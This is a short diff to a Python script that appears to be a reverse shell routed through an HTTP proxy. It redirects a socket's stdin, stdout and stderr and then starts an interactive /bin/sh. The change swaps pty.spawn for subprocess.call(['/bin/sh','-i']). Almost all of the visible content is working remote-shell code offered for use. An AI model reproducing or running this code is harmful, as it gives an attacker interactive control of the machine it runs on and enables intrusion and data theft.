@@ -1,4 +1,4 @@
-import socket, pty, os
+import socket, pty, os, subprocess
 from base64 import b64encode
 
 def http_proxy_connect(address, proxy = None, auth = None, headers = {}):
@@ -75,4 +75,5 @@ print b,c
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
-pty.spawn("/bin/sh")
+#pty.spawn("/bin/sh")
+subprocess.call(["/bin/sh","-i"]);
